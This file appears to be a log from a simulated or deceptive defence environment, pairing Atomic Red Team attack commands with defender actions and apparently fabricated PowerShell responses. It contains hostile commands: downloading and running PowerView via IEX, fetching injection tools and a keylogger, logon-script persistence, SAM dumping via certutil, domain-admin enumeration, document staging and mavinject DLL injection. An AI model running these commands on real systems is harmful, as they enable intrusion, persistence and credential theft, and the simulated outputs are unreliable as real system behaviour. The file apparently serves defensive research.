+technique:9
+
+
+action:{ Restore to original state }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\..\ExternalPayloads\AdFind.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:6
+technique:3
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe" -OutFile "C:\atomics\..\ExternalPayloads\AdFind.exe"
+response:PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.015\bin\ListPlanting.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe" -OutFile "C:\atomics\T1055.015\bin\ListPlanting.exe"
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe" -OutFile ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Start-Process "C:\atomics\T1055.015\bin\ListPlanting.exe"
+response:Start-Process : Unable to find a process with the name 'ListPlanting.exe'. Verify the process name and call the cmdlet again.
+At line:1 char:1
++ Start-Process "C:\atomics\T1055.015\bin\ListPlanting.exe"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (ListPlanting.exe:String) [Start-Process], IOException
+    + FullyQualifiedErrorId : NoProcessFound,Microsoft.PowerShell.Commands.StartProcessCommand
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Start-Sleep -Seconds 7
+response:PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ Restore to original state }
+command:Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+response:PS C:\Users\chris>
+tactic:0
+technique:134
+
+
+action:{ Restore to original state }
+command:Get-AdGroup -Filter *
+response:Get-AdGroup : The term 'Get-AdGroup' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Get-AdGroup -Filter *
++ ~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Get-AdGroup:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"
+response:Hello from the Windows Command Prompt!
+PS C:\Users\chris>
+tactic:7
+technique:141
+
+
+action:{ Restore to original state }
+command:$C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
+response:At line:1
+Char: 2
++ $C:\atomics\T1055.004\bin\x64\NtQueueApcThreadEx.exe -debug
++  ~
+Missing '=' operator after variable name.
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:New-Item -ItemType Directory (Split-Path "C:\atomics\T1059.007\src\sys_info.js") -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/sys_info.js" -OutFile "C:\atomics\T1059.007\src\sys_info.js"
+response:Invoke-WebRequest : The remote name could not be resolved: 'raw.githubusercontent.com'
+At line:1 char:1
++ Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/sys_info.js" -OutFile ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:wscript "C:\atomics\T1059.007\src\sys_info.js"
+response:wscript : The term 'wscript' is not recognized as the name of a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ wscript "C:\atomics\T1059.007\src\sys_info.js"
++ ~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (wscript:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:$C:\atomics\T1055.012\bin\x64\CreateProcessWithPipe.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:At line:1
+Char: 2
++ $C:\atomics\T1055.012\bin\x64\CreateProcessWithPipe.exe -program "C:\Windows\System32\werfault.exe" -debug
++  ~
+Missing '=' operator after variable name.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:"C:\atomics\T1055.004\bin\T1055.exe"
+response:"C:\atomics\T1055.004\bin\T1055.exe" : The term 'C:\atomics\T1055.004\bin\T1055.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ "C:\atomics\T1055.004\bin\T1055.exe"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.004\bin\T1055.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:8
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:0
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:2
+technique:17
+
+
+action:{ modify powershell response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:Error: Access is denied.
+
+PS C:\Users\chris>
+tactic:1
+technique:107
+
+
+action:{ Restore to original state }
+command:New-Item -ItemType Directory (Split-Path "C:\atomics\T1056.001\src\Get-Keystrokes.ps1") -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:107
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile "C:\atomics\T1056.001\src\Get-Keystrokes.ps1"
+response:Invoke-WebRequest : The remote name could not be resolved: 'raw.githubusercontent.com'
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException
+PS C:\Users\chris>
+tactic:1
+technique:107
+
+
+action:{ Restore to original state }
+command:&"$C:\atomics\T1056.001\src\Get-Keystrokes.ps1" -LogPath $env:TEMP\key.log
+response:At line:1
+Char: 1
++ &"$C:\atomics\T1056.001\src\Get-Keystrokes.ps1" -LogPath $env:TEMP\key.log
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Missing '=' operator after variable name.
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:new-item "C:\atomics\..\ExternalPayloads\T1059_003note.txt" -value "This file has been created by T1059.003 Test 4" -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:3
+technique:29
+
+
+action:{ Restore to original state }
+command:cmd /c "for /l %x in (1,1,75) do start wordpad.exe /p C:\atomics\..\ExternalPayloads\T1059_003note.txt" | out-null
+response:PS C:\Users\chris>
+tactic:4
+technique:29
+
+
+action:
+command:New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:0
+technique:29
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip" -Outfile "C:\atomics\..\ExternalPayloads\curl.zip"
+response:Invoke-WebRequest : The remote name could not be resolved: 'curl.se'
+At line:1 char:1
++ Invoke-WebRequest "https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip" -Outfile "C:\atomics\..\ExternalPayloads\curl.zip"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException
+PS C:\Users\chris>
+tactic:0
+technique:29
+
+
+action:{ Restore to original state }
+command:Expand-Archive -Path "C:\atomics\..\ExternalPayloads\curl.zip" -DestinationPath "C:\atomics\..\ExternalPayloads\curl"
+response:Expand-Archive : Cannot find path 'C:\atomics\..\ExternalPayloads\curl.zip' because it does not exist.
+At line:1 char:1
++ Expand-Archive -Path "C:\atomics\..\ExternalPayloads\curl.zip" -DestinationPath "C:\atomics\..\ExternalPayloads\curl"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\..\ExternalPayloads\curl.zip:String) [Expand-Archive], IOException
+    + FullyQualifiedErrorId : PathNotFoundException
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:Copy-Item "C:\atomics\..\ExternalPayloads\curl\curl-8.4.0_6-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
+response:Copy-Item : Cannot find path 'C:\atomics\..\ExternalPayloads\curl\curl-8.4.0_6-win64-mingw\bin\curl.exe' because it does not exist.
+At line:1 char:1
++ Copy-Item "C:\atomics\..\ExternalPayloads\curl\curl-8.4.0_6-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\..\ExternalPayloads\curl\curl-8.4.0_6-win64-mingw\bin\curl.exe:String) [Copy-Item], IOException
+    + FullyQualifiedErrorId : PathNotFoundException
+PS C:\Users\chris>
+action:{ modify powershell response }
+command:whoami
+response:
+hslab\chris
+PS C:\Users\chris>
+
+tactic:1
+technique:40
+
+
+action:{ Restore to original state }
+command:Write-Host "You will need to install Microsoft Excel manually to meet this requirement"
+response:You will need to install Microsoft Excel manually to meet this requirement
+PS C:\Users\chris>
+tactic:4
+technique:0
+
+
+action:{ Restore to original state }
+command:copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+response:DestinationPath is not valid. (C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe)   
+Make sure that the path is correct and the directory exists.
+PS C:\Users\chris>
+tactic:4
+technique:148
+
+
+action:{ Restore to original state }
+command:$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","localhost"))
+response:Cannot create ActiveX component.
+PS C:\Users\chris>
+tactic:1
+technique:40
+
+
+action:{ Restore to original state }
+command:$com.ActivateMicrosoftApp("5")
+response:Method not found.
+PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:hslab\chris
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:$C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:C:\atomics\T1055.004\bin\x64\EarlyBird.exe : The term 'C:\atomics\T1055.004\bin\x64\EarlyBird.exe' is not recognized as a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ $C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\Sy ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.004\bin\x64\EarlyBird.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:0
+technique:66
+
+
+action:{ modify the response by change the access right }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
+response:VERBOSE:  Performing the operation "Get-DomainGroup" on target "hslab.com".
+ 
+Name                           GroupCategory   GroupScope    Description
+----                           -------------   ----------    -----------
+Domain Admins                 Universal       Global        Admins who have full control of the domain
+Enterprise Admins             Universal       Global        Admins who have full control of the entire forest
+Schema Admins                 Universal       Global        Admins who have full control of the schema
+Account Operators             Universal       Global        Groups allowed to manage user accounts
+Server Operators              Universal       Global        Groups allowed to manage servers
+Backup Operators              Universal       Global        Groups allowed to back up files and folders
+Print Operators               Universal       Global        Groups allowed to manage printers
+Guests                         Universal       Domain        Users with limited access to the domain
+Users                          Universal       Domain        Default group for regular users
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:New-Item : Cannot find path 'C:\atomics\T1055.011\bin' because it does not exist.
+At line:1 char:1
++ New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T10 ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.011\bin:String) [New-Item], InvalidOperationException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemCommand
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:Invoke-WebRequest : Could not find a part of the path 'C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe'.
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], FileNotFoundException
+    + FullyQualifiedErrorId : System.IO.FileNotFoundException, Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:Invoke-WebRequest : Could not find a part of the path 'C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin'.
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], FileNotFoundException
+    + FullyQualifiedErrorId : System.IO.FileNotFoundException, Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ modify powershell response }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe : The term 'C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe' is not recognized as a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:5
+technique:131
+
+
+action:{ Restore to original state }
+command:for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*
+response:cmdlet for is not recognized as the name of a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (for:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net localgroup
+response:Group Name                          Comment
+------------------------------------ -------
+Administrators                      Administrators have complete access to the computer/domain.
+Backup Operators                     Users in this group can back up files and directories.
+Guests                               Users in this group have limited access to the computer.
+Power Users                          Users in this group have advanced user rights.
+Remote Desktop Users                 Users in this group are allowed to connect remotely.
+Users                                Users in this group can log on locally.
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net group /domain
+response:Group Name                                    Comment
+---------------------------------------------- -------
+Domain Admins                                  Allows full control of the domain.
+Enterprise Admins                              Allows full control of the forest.
+Schema Admins                                  Allows full control of the domain schema.
+Domain Guests                                  A built-in group for guests in the domain.
+Domain Users                                   A built-in group for regular users.
+Account Operators                              Allows management of user accounts.
+Server Operators                               Allows management of servers.
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Block this command this time }
+command:net group "enterprise admins" /domain
+response:Access denied.
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net group "domain admins" /domain
+response:Group Name                                    Comment
+---------------------------------------------- -------
+Domain Admins                                  Allows full control of the domain.
+
+Member Name
+----------------------------------------------
+hslab\chris
+Administrator
+
+The command completed successfully.
+
+PS C:\Users\chris>
+tactic:2
+technique:141
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$startingDirectory = "C:\Users"
+response:PS C:\Users\chris> $startingDirectory = "C:\Users"
+
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Restore to original state }
+command:$outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+response:PS C:\Users\chris> $outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Restore to original state }
+command:$fileExtensionsString = ".doc, .docx, .txt" 
+response:PS C:\Users\chris> $fileExtensionsString = ".doc, .docx, .txt"
+
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ Restore to original state }
+command:$fileExtensions = $fileExtensionsString -split ", "
+response:PS C:\Users\chris> $fileExtensions = $fileExtensionsString -split ", "
+
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
+response:New-Item : The path 'C:\atomics\..\ExternalPayloads\T1005' exists already.
+At line:1 char:1
++ New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : AlreadyExists: (C:\atomics\..\ExternalPayloads\T1005:String) [New-Item], IOException
+    + FullyQualifiedErrorId : IOException
+
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Restore to original state }
+command:Function Search-Files {
+response:PS C:\Users\chris> Function Search-Files {
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:  param (
+response:PS C:\Users\chris>  param (
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:    [string]$directory
+response:PS C:\Users\chris>    [string]$directory
+
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:  )
+response:PS C:\Users\chris>  )
+
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
+response:PS C:\Users\chris>  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
+
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:    $fileExtensions -contains $_.Extension.ToLower()
+response:PS C:\Users\chris>    $fileExtensions -contains $_.Extension.ToLower()
+
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:  }
+response:PS C:\Users\chris>  }
+
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:
+command:  return $files
+response:PS C:\Users\chris> return $files
+
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:}
+response:PS C:\Users\chris> }}
+
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ Restore to original state }
+command:$foundFiles = Search-Files -directory $startingDirectory
+response:Search-Files : Cannot validate argument on parameter 'directory'. The argument is null or empty. Supply a non-empty argument and try the command again.
+At line:1 char:43
++ $foundFiles = Search-Files -directory $startingDirectory
++                                           ~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidData: (:) [Search-Files], ParameterBindingValidationException
+    + FullyQualifiedErrorId : System.Management.Automation.ParameterBindingValidationException
+
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:if ($foundFiles.Count -gt 0) {
+response:PS C:\Users\chris> if ($foundFiles.Count -gt 0) {
+
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:  $foundFilePaths = $foundFiles.FullName
+response:PS C:\Users\chris>   $foundFilePaths = $foundFiles.FullName
+
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
+response:Compress-Archive : Could not find a part of the path 'C:\atomics\..\ExternalPayloads\T1005\data.zip'.
+At line:1 char:1
++ Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Compress-Archive], IOException
+    + FullyQualifiedErrorId : PathNotFoundException
+    + FullyQualifiedErrorId : PathNotFoundException
+
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ Restore to original state }
+command:  Write-Host "Zip file created: $outputZip\data.zip"
+response:Write-Host : The term 'Write-Host' is not recognized as a name of a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ Write-Host "Zip file created: $outputZip\data.zip"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Write-Host:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:  } else {
+response:PS C:\Users\chris>  } else {
+
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ allow command execute this time }
+command:      Write-Host "No files found with the specified extensions."
+response:No files found with the specified extensions.
+
+PS C:\Users\chris>
+tactic:10
+technique:46
+
+
+action:{ Restore to original state }
+command:  }
+response:PS C:\Users\chris>  }
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.001\src\x64\T1055.001.dll") -ErrorAction ignore | Out-Null
+response:New-Item : Cannot find path 'C:\atomics\T1055.001\src\x64' because it does not exist.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1055.001\src\x64\T1 ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.001\src\x64:String) [New-Item], InvalidOperationException
+    + FullyQualifiedErrorId : PathNotFoundException
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "C:\atomics\T1055.001\src\x64\T1055.001.dll"
+response:Invoke-WebRequest : Could not find a part of the path 'C:\atomics\T1055.001\src\x64\T1055.001.dll'.
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], FileNotFoundException
+    + FullyQualifiedErrorId : System.IO.FileNotFoundException, Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:$mypid = (Start-Process notepad -PassThru).id
+response:PS C:\Users\chris> $mypid = (Start-Process notepad -PassThru).id
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:mavinject $mypid /INJECTRUNNING "C:\atomics\T1055.001\src\x64\T1055.001.dll"
